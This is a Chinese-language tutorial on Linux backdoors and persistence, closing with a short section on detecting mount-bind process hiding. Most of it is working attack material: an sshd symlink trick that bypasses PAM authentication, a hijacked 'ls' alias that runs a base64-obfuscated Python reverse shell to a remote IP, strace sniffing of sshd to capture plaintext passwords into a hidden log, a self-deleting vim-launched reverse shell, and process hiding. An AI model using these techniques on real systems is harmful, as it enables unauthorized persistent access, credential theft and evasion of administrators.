#### sshd软连接后门

`ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345 `

在/usr/loacl目录下创建一个su软连接指向sshd，再临时配置此sshd监听的端口为12345，当开启了PAM验证机制的时候，PAM模块则会搜寻PAM相关设定文件，设定文件一般是在/etc/pam.d/，对应pam文件名即为软连接文件名，当我们建立名为su的软连接，即使用了su的pam配置文件，而su的配置文件中有这样一句话 `auth    sufficient   pam_rootok.so`，对uid为0的root用户无条件通过认证。当我们指定端口为12345时，及使用了su的pam的配置文件，无条件通过认证。

#### 免密公钥

`ssh-keygen -t rsa`

第一次键入保存公私钥的路径，在输入密码时连续两次键入回车即可实现免密的密钥对，将公钥放在对应用户家目录的.ssh，目录下重命名为authorized_keys，将私钥设置为700权限，即可在攻击机上用-i指定私钥从而实现免密登录

#### alias后门

`alias [别名] "[表达式]"`

将ls命令替换为反弹shell

1. alias 不支持参数传递，只有函数才支持参数传递,所以需要用函数将ls的参数传递，否则受害者执行带参数的ls会报错
2. 传统的反弹shell反弹后终端就无响应了，很容易被发现，所以使用python脚本

   ```python
   import os,socket,subprocess;
   ret = os.fork()
   if ret > 0:
       exit()
   else:
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect(("192.168.1.4", 8888))
           os.dup2(s.fileno(), 0)
           os.dup2(s.fileno(), 1)
           os.dup2(s.fileno(), 2)
           p = subprocess.call(["/bin/bash", "-i"])
       except Exception as e:
           exit()
   ```

   os.fork()，创建一个子进程，并在父进程中退出，这样子进程就变成了一个孤儿进程，脱离了原来的父进程，可以继续运行，
3. 方便代码的执行，将要执行的python代码base64编码隐藏
4. 注意引号引起的二义性，转义引号

```shell
alias ls="alerts(){ ls $* --color=auto;python3 -c \"import base64,sys;exec(base64.b64decode('aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjQiLCA4ODg4KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwgIi1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp'))\";};alerts"
```

#### strace后门

```
ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}
```

列出所有的进程，找到含有 `sshd -D`的,并找到其pid

```
root       87517  0.0  0.0   6464  2168 pts/1    R+   23:11   0:00 grep --color=auto sshd -D
默认还有一条进程，所以用grep -v grep过滤
```

```
sshd 是 SSH 守护进程，负责处理 SSH 客户端的连接请求和会话管理，-D表示在前台运行，而不是作为后台进程

sshd -D 的用法适用于调试或测试环境中，因为它将 SSH 守护进程的日志输出直接打印到控制台，方便观察和调试
```

然后同strace跟踪读写操作，并将其错误输出重定向到/tmp/.sshd.log文件，&表示后台运行

```
strace是一个动态跟踪工具，它可以跟踪系统调用的执行
```

然后再读取sshd在登陆时的接收内容，在这部分内容中翻找明文密码

命令如下

```shell
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &)
grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/.sshd.log
```

#### vim后门

通过vim中的python模块执行python代码，首先将python后门文件放置到当前目录下

```python
import os,socket,subprocess;
ret = os.fork()
if ret > 0:
    exit()
else:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.31.63", 8888))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        exit()

```

执行命令，并在两秒后删除文件

```shell
(vim -E -c "py3file fork_shell.py"> /dev/null 2>&1) && sleep 2 && rm -f shell.py
```

#### 通过mount-bind隐藏进程

##### 原理

```shell
mount --bind [dir1] [dir2]
```

将前一个目录挂载到后一个目录上，队后一个目录的访问都是对前一个目录的访问

通过命令

```shell
mount --bind null /proc/PID
```

将当前目录的空目录挂载到/proc/PID下，netstat和ps命令都是通过/proc目录输出的，此命令会隐藏真实的进程文件，导致隐藏pid和执行的命令

##### 发现

获取当前系统挂载信息有以下方法

> 1. cat /proc/$$/mountinfo 获取当前挂载信息
> 2. cat /proc/mounts （内核提供， 不易蒙骗）
> 3. 直接执行mount 命令

其中1和2比较靠谱

3是获取/etc/mtab 的内容

> cp /etc/mtab .
> mount —bind /bin /proc/[pid]
> mv . /etc/mtab

这样的话，直接执行mount，就发现不了可以挂载，而1和2却能够发现

##### 排查思路

1. 查看端口，发现可疑端口PID和程序名被隐藏：`netstat -antp`
2. 查看proc目录下的文件

   ```
   drwxrwxr-x  2 i                i                           4096 May 10 20:26 4964
   drwxrwxr-x  2 i                i                           4096 May 10 20:26 4965
   ```

   在 `/proc` 文件系统中，许多文件是虚拟文件，它们不占用磁盘空间，大小为 0 字节，而发生了将空目录挂载到/porc/PID会使其大小为4KB，因为文件系统通常会以某个固定的块大小来存储数据，默认4KB
3. 查看可疑挂载

   ```
   678 679 8:5 /home/i/vim_shell/null /home/i/vim_shell/null rw,relatime shared:1 - ext4 /dev/sda5 rw,errors=remount-ro
   650 25 8:5 /home/i/vim_shell/null /proc/4964 rw,relatime shared:1 - ext4 /dev/sda5 rw,errors=remount-ro
   677 650 8:5 /home/i/vim_shell/null /proc/4964 rw,relatime shared:1 - ext4 /dev/sda5 rw,errors=remount-ro
   680 678 8:5 /home/i/vim_shell/null /home/i/vim_shell/null rw,relatime shared:1 - ext4 /dev/sda5 rw,errors=remount-ro
   679 29 8:5 /home/i/vim_shell/null /home/i/vim_shell/null rw,relatime shared:1 - ext4 /dev/sda5 rw,errors=remount-ro
   1307 25 8:5 /home/i/vim_shell/null /proc/4965 rw,relatime shared:1 - ext4 /dev/sda5 rw,errors=remount-ro
   ```

   /proc/4964，/proc/4965果然被挂载了
4. 卸载 `sudo umount /proc/4965;sudo umount /proc/4964`并执行 `netstat -antp`查看真实进程:

   ```
   tcp        0      0 192.168.31.172:33486    192.168.31.63:8888      ESTABLISHED 4964/python3 
   ```

   执行 `ps -aux | grep 4964`

   ```
   i@i-virtual-machine:/proc$ 
   i           4964  0.0  0.2  18844  9980 pts/1    S    20:44   0:00 python3 shell.py
   ```
5. 删除shell.py文件，kill后门进程，排查结束
